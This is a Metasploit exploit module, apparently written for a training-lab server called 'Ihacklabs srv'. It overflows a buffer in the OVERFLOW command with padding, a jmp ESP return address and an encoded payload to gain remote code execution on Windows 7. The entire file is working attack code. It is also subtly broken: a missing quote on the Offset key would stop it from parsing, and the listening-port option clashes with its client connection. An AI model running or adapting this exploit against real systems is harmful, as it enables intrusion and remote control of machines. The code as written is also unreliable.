##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ihacklabs_srv',
      'Description'    => %q{
          This module exploits a buffer overflow vulnerability found in the OVERFLOW command of the
          Ihacklabs srv. 
      },
      'Author'         =>
          [
            'miguel cobas',      # Initial Discovery and metasploit exploit creator
          ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'BadChars'  => "\x00\x04\x05\x33\x34\x6D\x6E\xBB\xBC\xDC\xDD",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested against - WINDOWS 7 X86.
          [ 'Universal', 	{ 'Ret' => 0x67826683, # jmp ESP - offsec_pwk_dll.dll
				   'Offset => 1008
				} ], # jmp ESP - offsec_pwk_dll.dll
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'May 2018'))
    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The ihacklabs_srv port to listen on", 4455 ]),
      ])

  end

  def exploit
    connect_login

    print_status('Generating payload...')
    buffer =    rand_text(target['Offset'])    
    buffer << [target.ret].pack('V')    
    buffer << payload.encoded
    send_cmd( ["OVERFLOW ", buffer], false )
    print_status('Payload Sent.')
    disconnect
  end
end
